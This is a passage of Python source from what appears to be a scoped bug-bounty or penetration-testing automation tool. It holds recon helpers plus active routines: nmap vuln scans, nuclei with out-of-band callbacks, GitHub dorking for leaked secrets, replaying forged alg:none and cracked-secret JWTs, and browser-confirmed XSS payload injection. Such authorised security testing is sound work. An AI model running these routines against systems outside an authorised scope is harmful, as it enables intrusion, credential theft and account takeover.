        return ToolResult("subfinder", domain, True, f"{len(subs)} subdomains found", subs)

    async def _get_json(self, url: str, timeout: int = 30):
        """GET a URL and parse JSON regardless of content-type (crt.sh / archive.org)."""
        import httpx
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout,
                                     headers={"User-Agent": _UA}) as c:
            r = await c.get(url)
            if r.status_code != 200:
                return None
            return json.loads(r.text)

    async def _run_crtsh(self, inp: dict) -> ToolResult:
        domain = inp["domain"]
        subs = []
        try:
            data = await self._get_json(f"https://crt.sh/?q=%.{domain}&output=json", timeout=30) or []
            seen = set()
            for entry in data:
                for name in entry.get("name_value", "").split("\n"):
                    name = name.strip().lstrip("*.")
                    if name and name not in seen and self.scope.validate(name)[0]:
                        seen.add(name)
                        subs.append({"subdomain": name, "source": "crt.sh"})
        except Exception as e:
            return ToolResult("crtsh", domain, False, "", [], str(e))
        self.recon["subdomains"].extend(s["subdomain"] for s in subs)
        return ToolResult("crtsh", domain, True, f"{len(subs)} CT log entries", subs)

    async def _run_wayback(self, inp: dict) -> ToolResult:
        domain = inp["domain"].lstrip("*.")
        urls = []
        try:
            api = (f"https://web.archive.org/cdx/search/cdx?url={domain}/*"
                   "&output=json&fl=original&collapse=urlkey&limit=1500")
            rows = await self._get_json(api, timeout=40) or []
            for row in rows[1:]:  # skip header row
                u = row[0] if isinstance(row, list) else row
                if u and self.scope.validate(u)[0]:
                    urls.append(u)
        except Exception as e:
            return ToolResult("wayback", domain, False, "", [], str(e))
        urls = list(dict.fromkeys(urls))
        self._add_urls(urls)
        # Provenance: archived endpoints enter the canonical graph tagged (source=wayback,
        # archived=True, tested=False, LOW conf) so they carry WHERE-they-came-from and land on
        # the needs-validation queue — an archived path is a hint to check against the CURRENT
        # target, never a live finding. Mirrors what github_recon already does for repo facts.
        try:
            if getattr(self, "graph", None) is not None:
                import archive_intel as _ai
                _ai.ingest_archived_endpoints(self.graph, domain, urls, source="wayback")
        except Exception:
            pass
        return ToolResult("wayback", domain, True, f"{len(urls)} archived URLs", [{"url": u} for u in urls[:50]])

    async def _run_dns(self, inp: dict) -> ToolResult:
        domain = inp["domain"].lstrip("*.")
        try:
            frag = await dns_recon.gather_dns(domain)
        except Exception as e:
            return ToolResult("dns", domain, False, "", [], str(e))
        self.recon["email"] = frag["email"]
        self.recon["caa_records"] = frag["caa_records"]
        self.recon["vendors"] = frag.get("vendors", [])
        self.recon["dns"] = frag["dns"]
        em = frag["email"]
        out = (f"SPF {'set' if em['spf'] else 'MISSING'}, "
               f"DMARC {'set' if em['dmarc'] else 'MISSING'}, "
               f"{len(frag['caa_records'])} CAA, {len(frag['vendors'])} vendors")
        return ToolResult("dns", domain, True, out, [{
            "spf": em["spf"], "dmarc": em["dmarc"], "caa": frag["caa_records"],
            "vendors": frag["vendors"], "mx": frag["dns"]["mx"], "ns": frag["dns"]["ns"]}])

    async def _run_asn(self, inp: dict) -> ToolResult:
        domain = inp["domain"].lstrip("*.")
        try:
            intel = await dns_recon.ip_intel(domain)
        except Exception as e:
            return ToolResult("asn", domain, False, "", [], str(e))
        asn = intel.get("asn") or {}
        self.recon.setdefault("ip_intel", []).append(intel)
        out = f"{len(intel.get('ips', []))} IP(s)"
        if asn.get("asn"):
            out += f", AS{asn['asn'].split()[0] if asn.get('asn') else ''} {asn.get('as_name', '')} " \
                   f"range {asn.get('prefix', '')}"
        return ToolResult("asn", domain, True, out.strip(), [{
            "ips": intel.get("ips", []), "asn": asn.get("asn", ""), "as_name": asn.get("as_name", ""),
            "prefix": asn.get("prefix", ""), "country": asn.get("country", ""),
            "registry": asn.get("registry", "")}])

    async def _run_github_recon(self, inp: dict) -> ToolResult:
        import httpx
        import github_recon as ghr
        domain = inp["domain"].lstrip("*.")
        token = os.getenv("BBH_GITHUB_TOKEN") or os.getenv("GITHUB_TOKEN")
        if not token:
            return ToolResult("github_recon", domain, True,
                              "Skipped — set BBH_GITHUB_TOKEN (your own read-only GitHub PAT) to enable", [])
        base = os.getenv("BBH_GITHUB_API", "https://api.github.com").rstrip("/")
        delay = float(os.getenv("BBH_GITHUB_DELAY", "2"))   # respect ~30/min code search
        dorks = ghr.build_dorks(domain, inp.get("org", ""), inp.get("extra_terms"))[:14]
        headers = {"User-Agent": _UA, "Authorization": f"Bearer {token}",
                   "Accept": "application/vnd.github.text-match+json"}
        findings, seen, hits_total, rate_limited = [], set(), 0, False
        async with httpx.AsyncClient(timeout=20, headers=headers) as c:
            for i, q in enumerate(dorks):
                try:
                    r = await c.get(f"{base}/search/code", params={"q": q, "per_page": 10})
                except Exception:
                    continue
                if r.status_code in (403, 429):             # rate limited — stop politely
                    rate_limited = True
                    break
                if r.status_code != 200:
                    continue
                try:
                    items = ghr.parse_code_search(r.json())
                except Exception:
                    items = []
                hits_total += len(items)
                for it in items:
                    key = (it["repo"], it["path"])
                    if key in seen:
                        continue
                    seen.add(key)
                    f = ghr.classify_hit(it, domain, q)
                    if f:
                        findings.append(f)
                if i < len(dorks) - 1 and delay > 0:
                    await asyncio.sleep(delay)
        self.recon.setdefault("github", []).append(
            {"domain": domain, "dorks": len(dorks), "hits": hits_total, "findings": len(findings)})
        # provenance: repo secret-leaks -> canonical-graph credential nodes (hash fingerprint + flagged
        # for bounded validation; the raw secret is NEVER stored). Makes archive_intel part of recon.
        try:
            import archive_intel as _ai
            secrets = [{"kind": "secret", "value": f.get("evidence", ""), "ref": None}
                       for f in findings if "secret-leak" in (f.get("tags") or [])]
            if secrets:
                _ai.ingest_repo_findings(self.graph, domain, secrets, source="github")
        except Exception:
            pass
        note = " (rate-limited, partial)" if rate_limited else ""
        return ToolResult("github_recon", domain, True,
                          f"{len(dorks)} dorks, {hits_total} hits, {len(findings)} secret/lead finding(s){note}",
                          findings)

    # ── ACTIVE ───────────────────────────────────────────────────
    async def _run_httpx(self, inp: dict) -> ToolResult:
        targets = inp["targets"]
        # host -> explicit base URL (scheme+port) for non-standard targets. When a
        # target has one, probe that exact URL so a local app on e.g. :42000 is found.
        bases = inp.get("bases") or {}
        ports = inp.get("ports", "80,443,8080,8443,3000,8000,9000")
        tmp = None
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                for t in targets[:400]:
                    f.write((bases.get(t) or t) + "\n")
                tmp = f.name
            out, err = await self._cmd(
                ["httpx", "-l", tmp, "-ports", ports, "-status-code", "-title",
                 "-tech-detect", "-silent", "-json"], timeout=300)
        finally:
            if tmp and os.path.exists(tmp):
                os.unlink(tmp)
        hosts = []
        missing = err.startswith("__MISSING__")
        if not missing:
            for line in out.strip().split("\n"):
                if not line.strip():
                    continue
                try:
                    d = json.loads(line)
                    h = {"url": d.get("url"), "status": d.get("status-code"), "title": d.get("title"),
                         "tech": d.get("technologies", []), "webserver": d.get("webserver")}
                    hosts.append(h)
                except Exception:
                    pass
        # Fallback probe: if the binary is absent OR returned nothing, a plain
        # HTTP(S) request still tells us which targets are live — so run_httpx
        # never reports "0 live" for a host that http_probe can reach.
        note = ""
        if not hosts:
            hosts = await self._httpx_fallback(targets, bases)
            if missing and hosts:
                note = " (via direct probe; httpx binary absent)"
        self.recon["live_hosts"].extend(hosts)
        self._add_urls([h["url"] for h in hosts if h.get("url")])
        if not hosts and missing:
            return ToolResult("httpx", "", False, "", [], "httpx not installed and no target answered a direct probe")
        return ToolResult("httpx", f"{len(targets)} probed", True, f"{len(hosts)} live hosts{note}", hosts)

    async def _httpx_fallback(self, targets: list, bases: dict = None) -> list:
        """Detect liveness with a direct GET when the httpx binary is missing or
        found nothing. Bounded, scheme-normalised, scope already validated."""
        bases = bases or {}
        hosts = []
        for t in targets[:25]:
            base = bases.get(t) or (t if "://" in t else None)
            candidates = [base] if base else [f"https://{t}", f"http://{t}"]
            for url in candidates:
                r = await self._http(url, "GET", capture=False)
                if not r.get("error") and r.get("status"):
                    title = ""
                    m = re.search(r"<title[^>]*>(.*?)</title>", r.get("body", ""), re.I | re.S)
                    if m:
                        title = m.group(1).strip()[:120]
                    hosts.append({"url": r.get("final_url") or url, "status": r["status"],
                                  "title": title, "tech": [],
                                  "webserver": {k.lower(): v for k, v in r["headers"].items()}.get("server")})
                    break   # first scheme that answers wins
        return hosts

    async def _http_probe(self, inp: dict) -> ToolResult:
        url = inp["url"]
        r = await self._http(url, "GET")
        if r.get("error"):
            return ToolResult("http_probe", url, False, "", [], r["error"])
        headers = {k.lower(): v for k, v in r["headers"].items()}
        title = ""
        m = re.search(r"<title[^>]*>(.*?)</title>", r["body"], re.I | re.S)
        if m:
            title = m.group(1).strip()[:120]
        # extract in-scope links + params to seed surface
        links = re.findall(r"""(?:href|src|action)=["']([^"'#]+)""", r["body"], re.I)
        abs_links = []
        base = urlparse(r["final_url"] or url)
        for l in links:
            if l.startswith("http"):
                abs_links.append(l)
            elif l.startswith("/"):
                abs_links.append(f"{base.scheme}://{base.netloc}{l}")
        self._add_urls([url] + abs_links)
        # Forms feed the injection surface. POST forms are stored so the planner can
        # reach POST-body sinks (e.g. the XML stock-check form → run_xxe). GET forms are
        # turned into a parameterized URL with benign values so query-injection probes
        # (run_sqli/run_sqlmap/run_xss/…) actually reach their inputs — otherwise a
        # GET-form SQLi like DVWA's ?id= is never tested (it's not a plain href).
        try:
            import csrf_tool as _csrf
            forms = self.recon.setdefault("forms", [])
            seen_actions = {f.get("action") for f in forms}
            synth_urls = []
            for fm in _csrf.parse_forms(r["body"], r["final_url"] or url):
                act = fm.get("action")
                method = (fm.get("method") or "GET").upper()
                if not act or not self.scope.validate(act)[0]:
                    continue
                if method == "POST":
                    if act not in seen_actions:
                        forms.append({"action": act, "method": "POST", "fields": fm.get("inputs", [])})
                        seen_actions.add(act)
                else:
                    names = [n for n in (fm.get("inputs") or []) if n]
                    if names:
                        base_act = act.split("#")[0]
                        sep = "&" if "?" in base_act else "?"
                        qs = "&".join(f"{_n}=1" for _n in names[:12])
                        synth = f"{base_act}{sep}{qs}"
                        if self.scope.validate(synth)[0]:
                            synth_urls.append(synth)
            if synth_urls:
                self._add_urls(synth_urls)     # enter the surface as parameterized endpoints
        except Exception:
            pass
        # feed guidance's http-header rules (first probe wins as the app root)
        if not self.recon.get("http"):
            self.recon["http"] = {"ok": True, "headers": r["headers"],
                                  "final_url": r["final_url"], "is_https": url.startswith("https")}
        lh = {"url": r["final_url"] or url, "status": r["status"], "title": title,
              "tech": [], "webserver": headers.get("server")}
        if not any(h.get("url") == lh["url"] for h in self.recon["live_hosts"]):
            self.recon["live_hosts"].append(lh)
        sec = {h: (h in headers) for h in
               ("content-security-policy", "strict-transport-security", "x-frame-options")}
        out = {"status": r["status"], "title": title, "server": headers.get("server"),
               "security_headers": sec, "links_found": len(abs_links)}
        return ToolResult("http_probe", url, True, f"{r['status']} {title}"[:80], [out])

    async def _run_whatweb(self, inp: dict) -> ToolResult:
        target = inp["target"]
        out, err = await self._cmd(["whatweb", "--log-json=/dev/stdout", "-q", target], timeout=60)
        if err.startswith("__MISSING__"):
            return ToolResult("whatweb", target, False, "", [], "whatweb not installed")
        findings = []
        for line in out.strip().split("\n"):
            if not line.strip():
                continue
            try:
                findings.append(json.loads(line))
            except Exception:
                pass
        return ToolResult("whatweb", target, True, "Fingerprint complete", findings)

    async def _run_fingerprint(self, inp: dict) -> ToolResult:
        import fingerprint as fp
        url = inp["url"]
        r = await self._http(url, "GET", capture=True)
        if r.get("error"):
            return ToolResult("fingerprint", url, False, "", [], r["error"])
        set_cookie = ""
        for k, v in (r.get("headers") or {}).items():
            if k.lower() == "set-cookie":
                set_cookie = v
                break
        techs = fp.fingerprint(r.get("headers", {}), set_cookie, r.get("body", ""))
        # merge tech names into recon live_hosts for the guidance engine
        names = [t["name"] for t in techs]
        final = r.get("final_url") or url
        for lh in self.recon["live_hosts"]:
            if lh.get("url") == final:
                lh["tech"] = list(dict.fromkeys((lh.get("tech") or []) + names))
                break
        else:
            self.recon["live_hosts"].append({"url": final, "status": r.get("status"),
                                              "title": "", "tech": names, "webserver": None})
        findings = []
        for t in fp.version_disclosures(techs):
            findings.append({
                "title": f"Version disclosure: {t['name']} {t['version']}", "severity": "low", "target": final,
                "description": f"{t['name']} version {t['version']} is disclosed via {t['source']}.",
                "impact": "A precise version lets an attacker match known CVEs for that build.",
                "reproduction_steps": [f"Read the {t['source']} on {final}",
                                       f"Search the CVE database for {t['name']} {t['version']}"],
                "cwe": "CWE-200", "family": "fingerprint", "tags": ["fingerprint", "disclosure"],
                "confidence": "candidate"})
        summary = ", ".join(f"{t['name']}{(' ' + t['version']) if t['version'] else ''}" for t in techs[:8]) or "none"
        return ToolResult("fingerprint", url, True, f"stack: {summary}",
                          findings + [{"technologies": techs}])

    async def _run_nmap(self, inp: dict) -> ToolResult:
        target = inp["target"]
        flags = inp.get("flags", "-sT -sV --top-ports 1000 -T3")
        from security import safe_flags
        flag_tokens = safe_flags(flags, ("-s", "-p", "-T", "--top-ports", "-Pn", "-n", "--open"))
        out, err = await self._cmd(["nmap"] + flag_tokens + ["-oX", "-", target], timeout=360)
        if err.startswith("__MISSING__"):
            return ToolResult("nmap", target, False, "", [], "nmap not installed")
        ports = []
        try:
            root = ET.fromstring(out)
            for port in root.findall(".//port"):
                state = port.find("state")
                if state is not None and state.get("state") == "open":
                    svc = port.find("service")
                    pid = port.get("portid")
                    proto = port.get("protocol")
                    name = svc.get("name", "") if svc is not None else ""
                    ver = f"{svc.get('product', '')} {svc.get('version', '')}".strip() if svc is not None else ""
                    ports.append({"port": pid, "proto": proto, "service": name, "version": ver})
                    self.recon["nmap"]["open_ports"].append(f"{pid}/{proto} open {name} {ver}".strip())
        except Exception:
            pass
        return ToolResult("nmap", target, True, f"{len(ports)} open ports", ports)

    async def _run_nmap_vuln(self, inp: dict) -> ToolResult:
        """Heavyweight nmap NSE vulnerability scan — the full `vuln` script category
        minus DoS (never crash the target), with service/version detection to drive
        the scripts. The script selection is HARD-CODED (not taken from free-form
        flags) so `--script` can never be operator-injected. Results are version/
        behaviour-based network-vuln signals, so every hit is a truth-first advisory
        LEAD (candidate confidence), never a confirmed finding. INTRUSIVE + slow."""
        import nmap_nse
        target = inp["target"]
        if not self.scope.validate(target)[0]:
            return ToolResult("nmap_vuln", target, False, "", [], f"SCOPE BLOCK: {target} not in scope")
        # `vuln and not dos` = every vulnerability-category script except denial-of-
        # service ones; --script-timeout caps any single slow script.
        cmd = ["nmap", "-sV", "--script", "vuln and not dos", "--script-timeout", "120s",
               "-oX", "-", target]
        out, err = await self._cmd(cmd, timeout=int(inp.get("timeout", 900)))
        if err.startswith("__MISSING__"):
            return ToolResult("nmap_vuln", target, False, "", [], "nmap not installed")
        findings = nmap_nse.parse_nse_vuln(out, target)
        self.recon.setdefault("nmap_vuln", []).extend(findings)
        return ToolResult("nmap_vuln", target, True,
                          f"{len(findings)} NSE vuln lead(s) [heavyweight vuln category, DoS excluded]",
                          findings)

    async def _run_nuclei(self, inp: dict) -> ToolResult:
        target = inp["target"]
        # HEAVY mode = the full vulnerability template set (CVEs, network vulns,
        # misconfig, exposures, default creds, weak SSL, takeovers). Much broader and
        # slower than the default safe tags. Because heavy templates include
        # version/behaviour-based CVE matches that are not exploit-confirmed, heavy
        # results are TRUTH-FIRST advisory LEADS (candidate confidence) — the default
        # safe-tag run stays confirmed (its misconfig/exposure matches are reliable).
        # deep/insane intensity auto-promotes nuclei to the full template set (as leads),
        # so "maximum coverage" needs no separate toggle — the explicit heavy flag still works.
        heavy = bool(inp.get("heavy")) or getattr(self, "intensity", "standard") in ("deep", "insane")
        default_tags = ("cve,network,misconfiguration,exposure,default-login,exposed-panels,ssl,takeover"
                        if heavy else "tech,misconfig,exposed-panels")
        tags = inp.get("tags", default_tags)
        severity = inp.get("severity", "low,medium,high,critical")
        # insane throws more concurrency at it; heavy runs get a longer budget.
        conc = "50" if getattr(self, "intensity", "standard") == "insane" else "25"
        timeout = int(inp.get("timeout", 900 if heavy else 360))
        # OOB/interactsh: standard keeps it OFF (faster, no external dependency), but
        # deep/insane turn it ON so nuclei's BLIND templates (blind SSRF/RCE, log4j,
        # SSTI callbacks) can actually confirm out-of-band. A self-hosted interactsh
        # server (INTERACTSH_SERVER) is used when set; otherwise nuclei's default.
        oob = getattr(self, "intensity", "standard") in ("deep", "insane")
        ncmd = ["nuclei", "-u", target, "-tags", tags, "-severity", severity,
                "-c", conc, "-silent", "-json"]
        if not oob:
            ncmd.append("-no-interactsh")
        else:
            _iserver = os.getenv("INTERACTSH_SERVER", "").strip()
            if _iserver:
                ncmd += ["-iserver", _iserver]
        out, err = await self._cmd(ncmd, timeout=timeout)
        if err.startswith("__MISSING__"):
            return ToolResult("nuclei", target, False, "", [], "nuclei not installed")
        findings = []
        for line in out.strip().split("\n"):
            if not line.strip():
                continue
            try:
                d = json.loads(line)
                rec = {"template": d.get("template-id"), "name": d.get("info", {}).get("name"),
                       "severity": d.get("info", {}).get("severity"), "url": d.get("matched-at"),
                       "host": d.get("host"),
                       "description": d.get("info", {}).get("description"),
                       "cvss": d.get("info", {}).get("classification", {}).get("cvss-score"),
                       "info": d.get("info", {}), "matched-at": d.get("matched-at")}
                if heavy:
                    rec["confidence"] = "candidate"   # heavy templates -> truth-first leads
                    rec["family"] = "nuclei_heavy"
                findings.append(rec)
                self.recon["nuclei"].append(rec)
            except Exception:
                pass
        label = ("heavy: full vuln template set -> leads" if heavy else "safe tags") + (" +OOB" if oob else "")
        return ToolResult("nuclei", target, True, f"{len(findings)} findings [{label}]", findings)

    async def _fetch_openapi(self, inp: dict) -> ToolResult:
        url = inp["url"]
        r = await self._http(url, "GET")
        if r.get("error"):
            return ToolResult("fetch_openapi", url, False, "", [], r["error"])
        try:
            spec = json.loads(r["body"])
        except Exception:
            return ToolResult("fetch_openapi", url, False, "", [], "Response is not valid JSON (not an OpenAPI spec)")
        base = urlparse(r["final_url"] or url)
        base_url = f"{base.scheme}://{base.netloc}"
        endpoints = surface_mod.endpoints_from_openapi(spec, base_url)
        endpoints = [e for e in endpoints if self.scope.validate(e)[0]]
        self._add_urls(endpoints)
        return ToolResult("fetch_openapi", url, True, f"{len(endpoints)} endpoints imported",
                          [{"url": e} for e in endpoints[:50]])

    async def _run_katana(self, inp: dict) -> ToolResult:
        url = inp["url"]
        _MISSING = "katana not installed (use http_probe / run_wayback instead)"
        # Pass the operator's auth headers (e.g. a session Cookie) so the crawl reaches
        # the POST-LOGIN surface. NOTE: katana's headless browser does NOT reliably
        # carry custom headers, but the plain HTTP crawler DOES — so for an
        # authenticated scan we crawl non-headless with -H; for an anonymous scan we
        # use headless + form-fill so JS SPAs render and fire their XHRs.
        auth_h = []
        for k, v in (self.session_headers or {}).items():
            if str(v).strip():
                auth_h += ["-H", f"{k}: {v}"]
        # never crawl a logout/session-kill URL — on an authed scan it would end the session
        no_logout = ["-cos", "logout|log-?out|signout|sign-?out|logoff|deauth"]
        # Intensity scales the crawl: deeper (-d), and at deep/insane also extract
        # endpoints from JS with jsluice (-jsl) and pull known files (-kf all:
        # robots.txt/sitemap.xml). More depth = a wider surface for every downstream
        # probe. Timeouts grow so deep crawls finish. Pure discovery — truth-first neutral.
        intensity = getattr(self, "intensity", "standard")
        depth = {"standard": 2, "deep": 3, "insane": 5}.get(intensity, 2)
        deep_flags = (["-jsl", "-kf", "all"] if intensity in ("deep", "insane") else [])
        t_base = {"standard": 200, "deep": 420, "insane": 720}.get(intensity, 200)
        crawl = ["-silent", "-jc", "-d", str(depth)] + deep_flags
        if auth_h:
            cmd = ["katana", "-u", url] + crawl + no_logout + auth_h  # authenticated crawl
            out, err = await self._cmd(cmd, timeout=t_base)
        else:
            out, err = await self._cmd(
                ["katana", "-u", url] + crawl + ["-headless", "-no-sandbox", "-aff"] + no_logout,
                timeout=t_base + 40)
        if err.startswith("__MISSING__"):
            return ToolResult("katana", url, False, "", [], _MISSING)
        # Nothing crawled (no headless browser, or an empty pass): retry a plain crawl
        # (carrying auth headers if we have them) so we still capture the surface.
        if not out.strip():
            out, err = await self._cmd(["katana", "-u", url] + crawl + no_logout + auth_h, timeout=max(120, t_base - 20))
            if err.startswith("__MISSING__"):
                return ToolResult("katana", url, False, "", [], _MISSING)
        urls = [u.strip() for u in out.splitlines() if u.strip().startswith("http")]
        urls = [u for u in urls if self.scope.validate(u)[0]]
        self._add_urls(urls)
        try:                                    # crawled URLs are intel: routes + external urls
            for _u in urls:
                self.intel.add("url", _u, "katana")
                _p = urlparse(_u).path
                if _p and _p != "/":
                    self.intel.add("route", _p, "katana")
        except Exception:
            pass
        note = " (authenticated)" if auth_h else ""
        if intensity != "standard":
            note += f" [{intensity}: depth {depth}]"
        return ToolResult("katana", url, True, f"{len(urls)} crawled URLs{note}", [{"url": u} for u in urls[:50]])

    async def _gql_post(self, c, endpoint: str, payload):
        """POST a GraphQL query/batch; return parsed JSON or None."""
        try:
            r = await c.post(endpoint, json=payload)
            return r.json()
        except Exception:
            return None

    async def _run_graphql(self, inp: dict) -> ToolResult:
        import httpx
        import graphql_tool as gql
        url = inp["url"]
        headers = {"User-Agent": _UA, "Content-Type": "application/json", **(self.session_headers or {})}
        endpoint = None
        introspection = None
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15, headers=headers) as c:
            # discover the live GraphQL endpoint among common paths (in-scope only)
            for cand in gql.endpoint_candidates(url):
                if not self.scope.validate(cand)[0]:
                    continue
                resp = await self._gql_post(c, cand, {"query": "{__typename}"})
                if gql.looks_like_graphql(resp):
                    endpoint = cand
                    break
            if not endpoint:
                return ToolResult("graphql", url, True, "No GraphQL endpoint found", [])

            introspection = await self._gql_post(c, endpoint, {"query": gql.INTROSPECTION_QUERY})
            batch_n = 5
            batch_resp = await self._gql_post(c, endpoint, gql.build_batch_array("{__typename}", batch_n))
            bogus_resp = await self._gql_post(c, endpoint, {"query": gql.BOGUS_FIELD_QUERY})

        findings = gql.analyze(endpoint, introspection, batch_resp, batch_n, bogus_resp)
        schema = gql.parse_schema(introspection)
        # seed the surface with the endpoint + enumerated operations
        self._add_urls([endpoint])
        self.recon.setdefault("graphql", []).append({"endpoint": endpoint, **schema})
        if self.mission_id:
            await self._http(endpoint, "POST", {"Content-Type": "application/json"},
                             body=json.dumps({"query": "{__typename}"}), capture=True)
        ops = len(schema.get("query_fields", [])) + len(schema.get("mutation_fields", []))
        return ToolResult("graphql", endpoint, True,
                          f"GraphQL at {endpoint}: {ops} operations, {len(findings)} issue(s)", findings)

    async def _run_jwt(self, inp: dict) -> ToolResult:
        import jwt_tool as jt
        token = inp["token"]
        res = jt.analyze(token, inp.get("extra_secrets"))
        if not res.get("decoded"):
            return ToolResult("jwt", "", False, "", [], "Not a valid JWT (need three base64url parts)")
        findings = list(res["findings"])
        url = inp.get("url")
        if url and self.scope.validate(url)[0]:
            hname = inp.get("header_name", "Authorization")

            def wrap(t):
                return f"Bearer {t}" if hname.lower() == "authorization" else t

            for label, forged in (("alg:none", res.get("forged_none")),
                                  ("cracked-secret admin", res.get("forged_admin"))):
                if not forged:
                    continue
                r = await self._http(url, headers={hname: wrap(forged)}, capture=True)
                if 200 <= r.get("status", 0) < 300:
                    findings.append({
                        "title": f"Forged JWT accepted ({label})", "severity": "critical", "target": url,
                        "description": f"The API accepted a {label} forged token (HTTP {r['status']}).",
                        "impact": "Authentication bypass / account takeover via forged JWT.",
                        "reproduction_steps": [f"Send the {label} forged token to {url}",
                                               f"Observe HTTP {r['status']} (authorized)"],
                        "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"]})
        self.recon.setdefault("jwt", []).append(
            {"header": res["decoded"]["header"], "cracked": bool(res.get("cracked_secret"))})
        summary = f"alg={res['decoded']['header'].get('alg')}, {len(findings)} issue(s)"
        if res.get("cracked_secret"):
            summary += f", secret='{res['cracked_secret']}'"
        return ToolResult("jwt", url or "token", True, summary, findings)

    async def _run_xss(self, inp: dict) -> ToolResult:
        import httpx
        url = inp["url"]
        params = inp.get("params") or xt.params_of(url)
        headers = {"User-Agent": _UA, **(self.session_headers or {})}
        reflected = []

        # 1) context-aware reflection analysis (fast, no browser)
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
            for p in params:
                cu = xt.set_param(url, p, xt.CANARY)
                if not self.scope.validate(cu)[0]:
                    continue
                try:
                    r = await c.get(cu, headers=headers)
                except Exception:
                    continue
                for ctx in xt.contexts_of(r.text):
                    bu = xt.set_param(url, p, xt.BREAKOUTS[ctx])
                    try:
                        rb = await c.get(bu, headers=headers)
                    except Exception:
                        continue
                    idx = xt.breakout_index(rb.text, ctx)
                    if idx != -1:
                        ev_snip = xt._evidence_snippet(rb.text, idx, xt.BREAKOUTS[ctx])
                        reflected.append((p, self._attach_poc(
                            xt.reflection_finding(url, p, ctx, evidence=ev_snip), bu, rb)))
                        break

        # 2) execution confirmation in a real browser (also catches DOM-only XSS)
        exec_findings = await self._xss_execute(url, params)

        def _param_of(title):
            bits = title.rsplit("'", 2)
            return bits[1] if len(bits) >= 2 else ""
        confirmed = {_param_of(f["title"]) for f in exec_findings}
        # drop a reflected candidate when the same param was browser-confirmed
        findings = [f for p, f in reflected if p not in confirmed] + exec_findings

        if self.mission_id and findings:
            await self._http(findings[0]["target"], "GET", capture=True)
        conf = sum(1 for f in findings if f.get("confidence") == "confirmed")
        return ToolResult("xss", url, True,
                          f"{len(findings)} XSS signal(s), {conf} browser-confirmed", findings)

    async def _xss_execute(self, url: str, params: list) -> list:
        """Load payloads in headless Chromium; an alert() firing = confirmed XSS.
        Best-effort: returns [] if Playwright/Chromium is unavailable."""
        chrome = _chrome_path()
        if not chrome:
            return []
        try:
            from playwright.async_api import async_playwright
        except Exception:
            return []
        os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
        findings = []
        # (where, param) injection targets
        targets = [("query", p, pl, xt.set_param(url, p, pl))
                   for p in (params or []) for pl in xt.EXEC_PAYLOADS]
        targets += [("fragment", "<fragment>", pl, xt.set_fragment(url, pl)) for pl in xt.EXEC_PAYLOADS]

        try:
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(
                    headless=True, executable_path=chrome,
                    args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
                ctx = await browser.new_context(ignore_https_errors=True)
                if self.session_headers:
                    hdrs = {k: v for k, v in self.session_headers.items() if k.lower() != "cookie"}
                    if hdrs:
                        await ctx.set_extra_http_headers(hdrs)
                await self._ctx_add_cookies(ctx)      # load authed pages logged-in
                page = await ctx.new_page()
                fired = {"msg": None}

                async def on_dialog(d):
                    fired["msg"] = d.message
                    try:
                        await d.dismiss()
                    except Exception:
                        pass
                page.on("dialog", lambda d: asyncio.ensure_future(on_dialog(d)))

                done = set()
                for where, p, pl, tu in targets:
                    if (where, p) in done or not self.scope.validate(tu)[0]:
                        continue
                    fired["msg"] = None
                    try:
                        await page.goto(tu, wait_until="load", timeout=8000)
                        await page.wait_for_timeout(350)
                    except Exception:
                        pass
                    if fired["msg"] and xt.MARK in str(fired["msg"]):
                        findings.append(self._attach_poc(
                            xt.execution_finding(url, p, pl, where), tu, None,
                            timing=f"headless Chromium executed the payload — alert() fired carrying marker {xt.MARK!r} "
                                   f"(load the URL in a browser to reproduce)"))
                        done.add((where, p))
                await browser.close()
        except Exception:
            return findings
        return findings

    async def _ctx_add_cookies(self, ctx) -> None:
        """Set the mission's session cookies on a Playwright context so the headless
        browser loads AUTHENTICATED pages logged-in. set_extra_http_headers can't reliably
        carry Cookie; add_cookies is the correct API. Domain = the first in-scope host.
        Without this, browser-confirmed XSS (reflected/stored/DOM) never fires on an
        authenticated target because the page loads logged-out. Best-effort."""
        ck = (self.session_headers or {}).get("Cookie") or (self.session_headers or {}).get("cookie")
        if not ck:
            return
        host = ""
        try:
            for e in self.scope.in_scope:
                host = (getattr(e, "value", "") or "").lstrip("*.").split("/")[0].split(":")[0]
                if host:
                    break
        except Exception:
            return
        if not host:
            return
        cookies = []
        for part in str(ck).split(";"):
            if "=" in part:
                n, v = part.strip().split("=", 1)
                if n.strip():
                    cookies.append({"name": n.strip(), "value": v.strip(), "domain": host, "path": "/"})
        if cookies:
            try:
                await ctx.add_cookies(cookies)
            except Exception:
                pass

    async def _browser_dialog_scan(self, urls: list, marker: str, per: float = 6.0) -> dict:
        """Load each URL in headless Chromium and return {"url":...} if a JS dialog
        carrying `marker` fires — proof that a STORED payload executed on that page.
        Best-effort: returns {} with no browser or if nothing fires."""
        chrome = _chrome_path()
        if not chrome:
            return {}
        try:
            from playwright.async_api import async_playwright
        except Exception:
            return {}
        os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
        hit = {}
        try:
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(
                    headless=True, executable_path=chrome,
                    args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
                ctx = await browser.new_context(ignore_https_errors=True)
                if self.session_headers:
                    hdrs = {k: v for k, v in self.session_headers.items() if k.lower() != "cookie"}
                    if hdrs:
                        await ctx.set_extra_http_headers(hdrs)
                await self._ctx_add_cookies(ctx)      # load authed pages logged-in
                page = await ctx.new_page()
                # capture ALL dialog messages, not just the last — a page with several
                # stored payloads (e.g. a guestbook) fires many alerts, and our marker may
                # not be the final one. Match if ANY fired dialog carries the marker.
                fired = {"msgs": []}

                async def on_dialog(d):
                    fired["msgs"].append(d.message)
                    try:
                        await d.dismiss()
                    except Exception:
                        pass
                page.on("dialog", lambda d: asyncio.ensure_future(on_dialog(d)))
                for u in urls:
                    if not self.scope.validate(u)[0]:
                        continue
                    fired["msgs"].clear()
                    try:
                        await page.goto(u, wait_until="load", timeout=int(per * 1000))
                        await page.wait_for_timeout(450)
                    except Exception:
                        pass
